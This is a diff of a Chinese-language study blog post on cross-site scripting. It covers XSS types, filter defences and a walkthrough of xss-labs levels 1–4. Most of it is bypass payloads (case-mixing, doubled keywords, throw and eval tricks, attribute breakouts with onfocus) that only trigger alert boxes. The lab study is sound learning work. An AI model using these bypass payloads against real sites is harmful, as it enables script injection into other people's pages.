@@ -19,17 +19,26 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="1.信息收集">
+    <meta name="description" content="XSS漏洞类型：1.反射型：与服务端交互，但是交互的数据一般不会被存在数据库中，一次性，所见即所得，一般出现在查询类页面等2.存储型：交互的数据会被存在数据库中，永久性存储，一般出现在留言板，注册等页面等3.DOM型：    1..DOM xss 通过js代码操作dom文档对象模型时触发的漏洞，不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的漏洞，大部分属于反射型，少部分属">
 <meta property="og:type" content="article">
 <meta property="og:title" content="小迪学习">
-<meta property="og:url" content="http://example.com/2024/09/21/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0%201/index.html">
+<meta property="og:url" content="http://example.com/2024/09/21/XSS-labs/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="1.信息收集">
+<meta property="og:description" content="XSS漏洞类型：1.反射型：与服务端交互，但是交互的数据一般不会被存在数据库中，一次性，所见即所得，一般出现在查询类页面等2.存储型：交互的数据会被存在数据库中，永久性存储，一般出现在留言板，注册等页面等3.DOM型：    1..DOM xss 通过js代码操作dom文档对象模型时触发的漏洞，不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的漏洞，大部分属于反射型，少部分属">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/09/21/XSS-labs/x">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020241123204657.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020241123204722.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020241123204850.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020241123204911.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020241123204947.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020241123205049.png">
+<meta property="og:image" content="http://example.com/images/Pasted%20image%2020241123205843.png">
 <meta property="article:published_time" content="2024-09-21T15:27:55.000Z">
-<meta property="article:modified_time" content="2024-10-30T13:58:41.166Z">
+<meta property="article:modified_time" content="2024-11-23T14:43:06.365Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/2024/09/21/XSS-labs/x">
   
   
   
@@ -198,7 +207,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          5 words
+          573 words
         
       </span>
     
@@ -209,7 +218,7 @@
         
         
         
-          1 mins
+          5 mins
         
       </span>
     
@@ -251,8 +260,21 @@
             
               <div class="markdown-body">
                 
-                <p>1.信息收集
-   </p>
+                <h2 id="XSS漏洞类型："><a href="#XSS漏洞类型：" class="headerlink" title="XSS漏洞类型："></a>XSS漏洞类型：</h2><p>1.反射型：与服务端交互，但是交互的数据一般不会被存在数据库中，一次性，所见即所得，一般出现在查询类页面等<br>2.存储型：交互的数据会被存在数据库中，永久性存储，一般出现在留言板，注册等页面等<br>3.DOM型：<br>    1..DOM xss 通过js代码操作dom文档对象模型时触发的漏洞，不与后台服务器产生数据交互，是一种通过DOM操作前端代码输出的时候产生的漏洞，大部分属于反射型，少部分属于存储型。<br>    2一般不与服务端进行交互</p>
+<h2 id="XSS防御的过滤方式："><a href="#XSS防御的过滤方式：" class="headerlink" title="XSS防御的过滤方式："></a>XSS防御的过滤方式：</h2><p>1.JS代码前端过滤<br>2.输入长度的限制<br>3.后端逻辑通过正则匹配来过滤输入，匹配关键字输入<br>    1.过滤：”&lt;”、”script”、”&gt;”等关键字符</p>
+<h2 id="XSS绕过方式："><a href="#XSS绕过方式：" class="headerlink" title="XSS绕过方式："></a>XSS绕过方式：</h2><p>1.通过抓包直接，在数据包中修改发送到后端，修改前端代码的长度限制<br>2.通过大小写混合，复写</p>
+<p>2.script标签<br>    <script>alert("xss");</script><br>3.input标签<br>    &lt;input onblur&#x3D;alert(“xss”) autofocus&gt; <input autofocus><br>    &lt;input onfocus&#x3D;alert(“xss”)&gt;<br>    &lt;input onclick&#x3D;alert(“xss”)&gt;<br>    &lt;input onmouseover&#x3D;alert(“xss”)&gt;</p>
+<h4 id="1-空格过滤"><a href="#1-空格过滤" class="headerlink" title="1. 空格过滤"></a>1. 空格过滤</h4><p>当空格被过滤了，可以用**&#x2F;和注释符**代替空格，</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">&lt;img/src<span class="hljs-operator">=</span><span class="hljs-string">&quot;x&quot;</span>/onerror<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)<span class="hljs-comment">;&gt;</span><br>&lt;img/**/src<span class="hljs-operator">=</span><span class="hljs-string">&quot;x&quot;</span>/**/onerror<span class="hljs-operator">=</span>alert(<span class="hljs-number">1</span>)<span class="hljs-comment">;&gt;</span><br></code></pre></td></tr></table></figure>
+<h4 id="2-引号过滤"><a href="#2-引号过滤" class="headerlink" title="2. 引号过滤"></a>2. 引号过滤</h4><p>在html中可以不使用引号，在js中，可以用<strong>反引号</strong>代替单双引号</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=x <span class="hljs-attribute">onerror</span>=alert(`xss`);&gt;<br>除了单引号其他都被编码，可以试试onclick<br></code></pre></td></tr></table></figure>
+<h4 id="3-括号过滤"><a href="#3-括号过滤" class="headerlink" title="3. 括号过滤"></a>3. 括号过滤</h4><p>当括号被过滤的时候可以使用<strong>throw</strong>来绕过。throw 语句用于当错误发生时抛出一个错误。（末尾有解释）<br><img src=x onerror="javascript:window.onerror=alert;throw 1"><br>4.关键词过滤<br>关键词过滤可能可以使用大小写绕过、双写绕过、字符串拼接绕过<br>    <sCRiPt>alert(1);</sCrIpT><br>    <scrscriptipt>alert(1);</scrscriptipt><br>    <img src="x" srcset="/img/loading.gif" lazyload onerror="a=`aler`;b=`t`;c='(`xss`);';eval(a+b+c)">  反引号代替单双引号</p>
+<h3 id="level-1"><a href="#level-1" class="headerlink" title="level 1"></a>level 1</h3><p><img src="/../images/Pasted%20image%2020241123204657.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/../images/Pasted%20image%2020241123204722.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="LEVEL-2"><a href="#LEVEL-2" class="headerlink" title="LEVEL 2"></a>LEVEL 2</h2><p><img src="/../images/Pasted%20image%2020241123204850.png" srcset="/img/loading.gif" lazyload><br><img src="/../images/Pasted%20image%2020241123204911.png" srcset="/img/loading.gif" lazyload></p>
+<script>alert("");</script>
+<p>“&gt;<script>alert("");</script>“&lt;<br><img src="/../images/Pasted%20image%2020241123204947.png" srcset="/img/loading.gif" lazyload><br>LEVEL 3<br><img src="/../images/Pasted%20image%2020241123205049.png" srcset="/img/loading.gif" lazyload><br>发现符号被过滤&lt;&gt;，利用onfocus事件方法可以绕过html实体化（即&lt;&gt;号的过滤）。<br>‘ onfocus&#x3D;javascript:alert() ‘</p>
+<p>LEVEL4<br><img src="/../images/Pasted%20image%2020241123205843.png" srcset="/img/loading.gif" lazyload><br>输入&lt;&gt;后发现依然被过滤，利用onfocus方法注入，可以看到闭合方法是””，所以修改为<br>“ onfocus&#x3D;javascript:alert() “</p>
 
                 
               </div>
@@ -271,7 +293,7 @@
   <div class="license-box my-3">
     <div class="license-title">
       <div>小迪学习</div>
-      <div>http://example.com/2024/09/21/小迪学习 1/</div>
+      <div>http://example.com/2024/09/21/XSS-labs/</div>
     </div>
     <div class="license-meta">
       
@@ -325,8 +347,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/09/21/%E5%B0%8F%E8%BF%AA%E5%AD%A6%E4%B9%A0/" title="小迪学习">
-                        <span class="hidden-mobile">小迪学习</span>
+                      <a href="/2024/09/21/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" title="信息收集">
+                        <span class="hidden-mobile">信息收集</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
